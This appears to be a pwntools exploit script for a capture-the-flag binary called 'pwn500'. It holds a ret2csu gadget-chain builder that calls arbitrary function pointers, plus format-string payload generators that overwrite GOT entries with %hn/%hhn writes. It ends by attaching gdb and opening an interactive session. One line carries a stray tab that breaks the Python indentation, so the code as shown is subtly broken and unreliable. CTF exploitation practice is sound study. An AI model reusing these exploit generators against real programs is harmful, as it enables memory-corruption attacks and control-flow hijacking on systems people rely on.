from pwn import *

context.log_level = 'debug'
#context.aslr = False

io = process('./pwn500')
e = ELF('./pwn500')
libc = e.libc

def com_gadet(func_ptr, arg1=0, arg2=0, arg3=0):
	addr_pop = 0x00401866 
	addr_call = 0x00401850
	payload = ''
	payload += p64(addr_pop) 
	payload += 'A' * 8       # add     rsp, 8
	payload += p64(0x0)      # rbx = 0
	payload += p64(0x1)      # rbp = 1
	payload += p64(func_ptr) # r12
	payload += p64(arg3)     # r13 = rdx = arg3
	payload += p64(arg2)     # r14 = rsi
	payload += p64(arg1)     # r15d = edi
	payload += p64(addr_call)    # call *func_ptr
	payload += 'A'* 8 * 7    
	return payload

def answer(recv_buf, send_buf, newline= True):
	io.recvuntil(recv_buf)
	if newline:
		io.sendline(send_buf)
	else:
		io.send(send_buf)

def gen_fmt_payload(write_map, write_bits='hn', printed=0, testing=False):
    """
    Format string payload generator.
    write_map:  [(write_value,arg_index eg),..]: [(0xdead,0x12), (0xbeef,0x13)]
    write_bits: n, hn, hhn
    printed:  bytes has been printed.
    testing: return %p format to test address.

    write_map = [(0xdead,0x10), (0xbeef,0x11)]
    payload = gen_fmt_payload(write_map)
    """
    if testing:
        payload =  ''.join('%{}$p'.format(idx) for value,idx in sorted(write_map))

    else:
        payload = ''
        # sorted by value in ascending order.   
        for value, idx in sorted(write_map):  
            n_char = value - printed
            assert n_char >= 0, "printed:%d, value=%d" % (printed, value)
            if n_char > 0:
                payload += '%{}c'.format(n_char)
            # else n_char == 0, then just without %c
            payload += '%{}${}'.format(idx, write_bits)
            
            printed = value 

    print '[+++++++++++] format payload: ' + payload
    return payload


def gen_map_and_addr(buf, addr, idx_base, write_bits='hn', printed = 0,  arch = 'x86'):
    """
    usage:
	    write_map1 , addr_buf1 = gen_map_and_addr(p32(e.plt['printf']), e.got['strlen'], 66+14, 'hhn')
		write_map2 , addr_buf2 = gen_map_and_addr(p32(main), e.got['strspn'], 66+14+4, 'hhn')

		buf = gen_fmt_payload(write_map1+write_map2,'hhn')
    """
    write_map = [] # [(value, idx),..]
    addr_buf = ''
  	paddr = p32 if arch == 'x86' else p64

    if write_bits == 'hn':
        if len(buf) % 2 == 1: buf += '\x00' # align.
        for i in range(0, len(buf), 2):
            value = u16(buf[i:i+2])
            while value < printed: value += 0x10000
            idx = i/2 + idx_base
            write_map.append((value, idx))
            addr_buf += paddr(addr + i)        # 64 bit change this!!!

    if write_bits == 'hhn':
        for i in range(len(buf)):
            value = ord(buf[i])
            while value < printed: value += 0x100
            idx = i + idx_base
            write_map.append((value, idx))
            addr_buf += paddr(addr + i)  # 64 bit change this!!!

    return write_map, addr_buf


gdb.attach(io, "b *0x401F6F")

io.interactive()

